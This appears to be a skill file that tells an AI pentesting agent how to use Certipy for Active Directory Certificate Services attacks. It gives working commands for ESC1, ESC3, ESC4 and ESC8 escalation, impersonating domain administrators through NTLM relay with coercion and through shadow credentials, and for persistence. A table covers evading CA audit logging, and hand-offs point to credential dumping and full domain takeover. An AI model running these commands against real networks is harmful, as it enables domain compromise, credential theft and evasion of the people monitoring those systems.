---
name: Certipy
description: Active Directory Certificate Services (AD CS) attack toolkit for certificate template abuse, ESC1-ESC8 privilege escalation, and certificate theft
---

# Certipy

Pull this skill when you have domain credentials and want to enumerate AD CS vulnerabilities (ESC1 through ESC13). Certificate Services misconfigurations are among the most reliable paths to Domain Admin in modern AD environments.

## RedAmon wiring

| Action | Tool | Notes |
|--------|------|-------|
| Enumerate CA + templates | `kali_shell` — `certipy find` | Discover AD CS vulnerabilities |
| Request vulnerable cert | `kali_shell` — `certipy req` | Request certificate for impersonation |
| Authenticate with cert | `kali_shell` — `certipy auth` | Get NTLM hash from PFX cert |
| Relay to CA (ESC8) | `kali_shell` — `certipy relay` | NTLM relay to AD CS endpoint |
| Persist with new cert | `kali_shell` — `certipy req` | Create durable backdoor |
| Shadow credentials | `kali_shell` — `certipy shadow` | Add key credentials to an account |

## Primer

AD CS vulnerabilities are numbered ESC1-ESC13:

| ESC | Name | Prerequisites |
|-----|------|---------------|
| ESC1 | Template with CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT | Unprivileged user can request cert for another user |
| ESC2 | Template with Any Purpose EKU (2.5.29.37.0) | Template allows client auth, can be used for smartcard logon |
| ESC3 | Template with Certificate Request Agent EKU | Can request cert on behalf of another user |
| ESC4 | Vulnerable ACL on template | User has write access to a certificate template |
| ESC5 | Vulnerable ACL on CA | User has admin rights on the CA server |
| ESC6 | CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag | CA allows SAN in certificate from any template |
| ESC7 | Vulnerable CA ACL — Manage CA or Manage Certificates | Low-privileged user has CA admin rights |
| ESC8 | NTLM Relay to AD CS Web Enrollment | Web enrolment endpoint available via HTTP |
| ESC9 | No Security Extension + StrongCertificateBindingEnforcement disabled | Similar to ESC1 but for specific configurations |
| ESC10 | Weak certificate binding for key-based renewal | Weak certificate mapping in AD |
| ESC11 | ICERTPASS through RPC endpoint | NTLM relay to RPC endpoint |
| ESC12 | ADFS and/or Azure AD Kerberos tickets | ADFS as an escalation path |
| ESC13 | CA with OID group linkage template | Certificate maps to AD group via OID |

**Most common in practice**: ESC1, ESC3, ESC8, ESC4, ESC6 (in rough order of frequency).

## Basic usage

```bash
# Find misconfigurations (credentials)
certipy find -u user@target.local -p Password123 -dc-ip 10.0.0.1

# Save output to file (parsable)
certipy find -u user@target.local -p Password123 -dc-ip 10.0.0.1 -output adcs_findings

# BloodHound-compatible output
certipy find -u user@target.local -p Password123 -dc-ip 10.0.0.1 -bloodhound
```

## Key commands

### Find (enumerate AD CS)
```bash
# Basic find
certipy find -u user@target.local -p Password123 -dc-ip 10.0.0.1

# With JSON output for parsing
certipy find -u user@target.local -p Password123 -dc-ip 10.0.0.1 -json -output results

# List only vulnerable templates (parsable output)
certipy find -u user@target.local -p Password123 -dc-ip 10.0.0.1 \
  -stdout | grep "ESC" -A 10
```

### Exploiting ESC1 (template allows enrollee to supply SAN)
```bash
# 1. Find the vulnerable template with certipy find (look for ESC1)

# 2. Request a certificate as Domain Admin
certipy req -u user@target.local -p Password123 -dc-ip 10.0.0.1 \
  -ca CA-SERVER -template VULN_TEMPLATE \
  -upn administrator@target.local \
  -out admin.pfx

# 3. Authenticate with the certificate
certipy auth -pfx admin.pfx -dc-ip 10.0.0.1
# This gives you the NTLM hash of the target user (administrator)
```

### Exploiting ESC3 (Certificate Request Agent)
```bash
# 1. Request the enrollment agent certificate
certipy req -u user@target.local -p Password123 -dc-ip 10.0.0.1 \
  -ca CA-SERVER -template EnrollmentAgent \
  -out agent.pfx

# 2. Request on behalf of Domain Admin
certipy req -u user@target.local -p Password123 -dc-ip 10.0.0.1 \
  -ca CA-SERVER -template User -on-behalf-of target.local\administrator \
  -pfx agent.pfx -out admin.pfx

# 3. Authenticate
certipy auth -pfx admin.pfx -dc-ip 10.0.0.1
```

### Exploiting ESC8 (NTLM relay to AD CS Web Enrollment)
```bash
# 1. Start the relay
certipy relay -ca CA-SERVER -template DomainController

# 2. In another terminal, coerce auth from a DC (using PrinterBug, PetitPotam, etc.)
python3 /tools/dementor.py -d target.local CA-SERVER DC_IP
# or
impacket-ntlmrelayx -t http://CA-SERVER/certsrv/certfnsh.asp -smb2support
```

### ESC4 (write ACL on template)
```bash
# If you have write access to a template (certipy find shows ESC4),
# modify the template to make it vulnerable:
certipy template -u user@target.local -p Password123 -dc-ip 10.0.0.1 \
  -template VULN_TEMPLATE -save-old

# Now exploit it as ESC1
certipy req -u user@target.local -p Password123 -dc-ip 10.0.0.1 \
  -ca CA-SERVER -template VULN_TEMPLATE \
  -upn administrator@target.local -out admin.pfx
```

### Shadow credentials (add keys to an account)
```bash
# If you have GenericAll/GenericWrite on a user or computer:
certipy shadow auto -u user@target.local -p Password123 -dc-ip 10.0.0.1 \
  -account target_admin

# This adds keyCredentials to the target account,
# enabling certificate-based authentication
```

## Key flags

| Flag | Purpose |
|------|---------|
| `-u` | Username (DOMAIN\user or user@domain) |
| `-p` | Password |
| `-dc-ip` | Domain controller IP |
| `-ca` | Certificate Authority server name |
| `-template` | Certificate template name |
| `-upn` | User Principal Name to impersonate |
| `-out` | Output PFX file |
| `-pfx` | Input PFX file (for auth or on-behalf-of) |
| `-on-behalf-of` | Target for ESC3 delegation |
| `-bloodhound` | Output BloodHound-compatible format |
| `-json` | JSON output |
| `-stdout` | Print to stdout |
| `-debug` | Debug output |
| `-dns` | DNS server for relay |
| `-target` | Target IP/domain |

## Interpreting certipy find output

```
Certificate Templates
[...]
    ESC1                                           ❌
      vuln_template                                ❌
        [!] Vulnerabilities
          Flags: ENROLLEE_SUPPLIES_SUBJECT          ← Template allows SAN
          Any Purpose EKU                           ← Template allows all EKUs
        [*] User can specify Subject Alternative Name
        [*] No issuance policies

    ESC3                                            ❌
      EnrollmentAgent                               ❌
        [!] Vulnerabilities
          Certificate Request Agent EKU (1.3.6.1.4.1.311.20.2.1)

    ESC8                                            ❌
      Web Enrollment                                ❌
        [!] http://CA-SERVER/certsrv/               ← NTLM relay target
```

**What to prioritise**:
1. **ESC1** — simplest, most reliable. If you find it, exploit immediately.
2. **ESC8** — if web enrolment is on HTTP (not HTTPS), relay+coerce is almost always reliable.
3. **ESC3** — slightly more complex but reliable.
4. **Shadow Credentials** — if you have GenericAll/GenericWrite on any high-value target.

## Pitfalls and recovery

| Pitfall | Fix |
|---------|-----|
| "Could not find CA" | The CA name may differ from the server name. Run `certipy find` with no `-ca` to list CAs. |
| "Not authorized" for template | Your user doesn't have Enroll permission on that template. Check `certipy find` output for allowed principals. |
| PFX cert not working for auth | Certificate may not have SmartCard Logon or Client Auth EKU. Check with `openssl pkcs12 -info -in cert.pfx`. |
| ESC1 works but auth fails (KDC_ERR_BADOPTION) | Domain Controller may not be mapped to the certificate SAN. Try with `-dns` flag. |
| ESC8 relay target not available | Check if `http://CA/certsrv/` is accessible. Use `execute_curl` first. |
| "Certificate not trusted" | The CA root cert may not be in the DC's trusted store. Try with `-ldap` for weak binding. |
| Hash format not crackable | Sometimes certipy returns hashes that need different cracking modes (check with `hashid`). |

## Detection avoidance

| Signal | Mitigation |
|--------|------------|
| CA auditing logs (4886, 4887) | Hard to avoid — any certificate request is logged. |
| ESC8 relay triggers logon events | The relay source IP will be logged. Use a clean relay host. |
| Shadow credentials modify msDS-KeyCredentials | Modification event is logged. Use once, then remove. |
| High request rate to CA | One-off requests are normal admin behaviour. Bulk requests stand out. |

## Hand-off

- After getting NTLM hash: `-> /skill/tooling/impacket` for `secretsdump.py` or `wmiexec.py`
- After getting DA hash: `-> /skill/active_directory/ad_kill_chain` for full domain takeover
- For certificate-to-hash: `-> /skill/tooling/hashcat` if you need to crack the cert password
- For BloodHound exploitation path: `-> /skill/tooling/bloodhound` (certipy can output BloodHound-compatible data with `-bloodhound`)

## Pro tips

- **Always run `certipy find` first**: It takes 10 seconds and shows all available escalation paths. Never try to guess which ESC to exploit — let the tool tell you.
- **ESC8 + coerce = free DA**: If the CA web enrolment endpoint is HTTP (not HTTPS), this is the most reliable DA path. Coerce auth from any DC or server with admin privileges, relay it to the CA, and get a certificate for that server which often leads to DA.
- **Combine with BloodHound**: `certipy find -bloodhound` outputs to BloodHound-compatible JSON. Import it to see AD CS attack paths alongside other privilege escalation paths in a single graph.
- **The PFX password is empty by default**: Certipy PFX files have no password. If you need to protect them (multi-step), use `-password` flag.
- **Check the CA server's hostname via LDAP**: `certipy find` queries LDAP for CA servers. If it returns nothing, the CA may not be published in LDAP. Try directly with `-ca CA-SERVER.domain.local`.
